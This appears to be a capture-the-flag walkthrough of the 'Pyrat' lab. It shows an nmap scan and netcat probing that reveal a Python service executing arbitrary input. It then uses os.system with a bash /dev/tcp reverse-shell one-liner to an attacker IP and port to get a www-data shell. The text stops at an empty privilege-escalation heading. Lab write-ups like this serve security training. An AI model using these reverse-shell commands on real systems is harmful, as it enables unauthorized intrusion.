# Pyrat Walkthrough

## Lab Description:
Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

## Gaining Initial Access:

### Information Gathering:
Let's begin our information gathering by doing an `nmap` scan:
```
sudo nmap -sV -sC -v <target_ip>
```
> `-sV` does a scan to id the version of the services running on the machine, so the scan might take a few minutes.  

We get the following output from the nmap scan:
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=11/8%Time=690F72F6%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20defin
SF:ed\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\x20
SF:null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<strin
SF:g>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cannot\
SF:x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\x20
SF:is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x20n
SF:ot\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20string\x
SF:20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"sour
SF:ce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Help,1
SF:B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invalid\x
SF:20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\x20
SF:syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20cod
SF:e\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,"so
SF:urce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Java
SF:RMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\
SF:n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20
SF:bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x20n
SF:ull\x20bytes\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> Output from nmap scan

There are two services externally open on the machine:
- ssh running on port 22
- a ==simple python http server== running on port 8000

### Further Enumerating Service:

Let's attempt to interact with the http server, we can either use the browser or `curl`:

```
curl http://<target_ip>:8000/
```

We get the following output:
```
Try a more basic connection! 
```

The messages tells us that we need to try to connect in a more basic way. Let's use `nc` to interact with the server:

```
nc <target-ip> 8000
```

We were able to connect to the server but nothing appears.
```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
```
Let's attempt to interact with the server:

```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
```
We have recieved an error, since this is a simple python server we should try a python command:

```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
print("hello world!")
hello world!
``` 

We discovered that we can run python commands on the machine by interacting with the http server!

### Exploiting the Simple Python Server:

Let's gain a reverse shell using the http server and some simple python commands:
1. Import the `os` library to our python environment, this will give us access to functions that can send commands to the operating system:
```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
print("hello world!")
hello world!

import os
```
2. Now we can send commands to the OS using the `os.system()` function, but first we need to know what type of OS is running so we can send the right commands. We figure that out using the `os.name` command:
```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
print("hello world!")
hello world!

import os

print(os.name)
```
We get the following output:
```
posix
```
Which means that this is a unix system, so it probably a flavor o linux. We can use a simple bash one-liner payload to start a reverse shell connection like: `bash -c 'exec bash -i &>/dev/tcp/<hackers-ip>/<hacker-port> <&1'`
3. Before we run the payload on the target machine lets open a port on our machine to recieve the reverse shell:
```
$ nc -nvlp 4444
listening on [any] 4444 ...
```
4. Finally let's run the payload on the target machine's http server:
```
$ nc -nv 10.201.37.125 8000
(UNKNOWN) [10.201.37.125] 8000 (?) open
test
name 'test' is not defined
print("hello world!")
hello world!

import os

print(os.name)
posix

os.system("bash -c 'exec bash -i &>/dev/tcp/10.6.46.187/4444 <&1 '")

```
5. Now if we check our `nc` listener we should have received a connection:
```
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.6.46.187] from (UNKNOWN) [10.201.37.125] 39768
bash: cannot set terminal process group (719): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@ip-10-201-37-125:~$
```
We are in the system!

## Escalating Privileges on the machine 
